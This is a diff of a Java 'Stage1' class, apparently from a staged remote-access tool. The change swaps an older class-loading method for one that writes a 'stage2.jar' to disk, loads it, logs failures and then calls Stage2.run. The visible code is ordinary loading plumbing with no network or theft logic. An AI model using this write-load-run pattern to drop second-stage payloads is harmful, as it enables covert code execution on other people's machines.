@@ -1,19 +1,16 @@
 package subterranean.crimson.permajar.stage1;
 
 import java.io.File;
-import java.io.IOException;
 import java.io.InputStream;
 import java.lang.reflect.Method;
 import java.net.MalformedURLException;
 import java.net.URL;
 import java.net.URLClassLoader;
-import java.util.Enumeration;
 import java.util.HashMap;
 import java.util.Scanner;
-import java.util.jar.JarEntry;
-import java.util.jar.JarFile;
 
 import subterranean.crimson.permajar.stage1.network.Communications;
+import subterranean.crimson.permajar.stage2.Stage2;
 import subterranean.crimson.universal.FileLocking;
 import subterranean.crimson.universal.Logger;
 import subterranean.crimson.universal.Utilities;
@@ -125,40 +122,6 @@ public class Stage1 {
 		options = o;
 	}
 
-	public static void _loadStage2() {
-		Logger.add("Loading Stage2");
-
-		String pathToJar = "stage2.jar";
-		// load
-		try {
-			JarFile jarFile = new JarFile(pathToJar);
-			Enumeration e = jarFile.entries();
-
-			URL[] urls = { new URL("jar:file:" + pathToJar + "!/") };
-			URLClassLoader cl = new URLClassLoader(urls);
-
-			while (e.hasMoreElements()) {
-				JarEntry je = (JarEntry) e.nextElement();
-				if (je.isDirectory() || !je.getName().endsWith(".class")) {
-					continue;
-				}
-				// -6 because of .class
-				String className = je.getName().substring(0, je.getName().length() - 6);
-				className = className.replace('/', '.');
-				try {
-					Class c = cl.loadClass(className);
-				} catch (Throwable e1) {
-					// forget it
-					Logger.add("Couldnt load: " + je.getName());
-				}
-
-			}
-		} catch (IOException e) {
-			// TODO Auto-generated catch block
-			e.printStackTrace();
-		}
-	}
-
 	public static void loadStage2() {
 
 		try {
@@ -166,6 +129,8 @@ public class Stage1 {
 		} catch (MalformedURLException e) {
 			// TODO Auto-generated catch block
 			e.printStackTrace();
+			Logger.add("Failed to load stage 2");
+			return;
 		}
 		Logger.add("Loaded Stage2");
 	}
@@ -174,6 +139,7 @@ public class Stage1 {
 		Logger.add("Writing Stage2 Jar");
 		Utilities.write(s2, "stage2.jar");
 		loadStage2();
+		Stage2.run(new String[]{"notInitial"});
 	}
 
 	public static void addURL(URL u) {
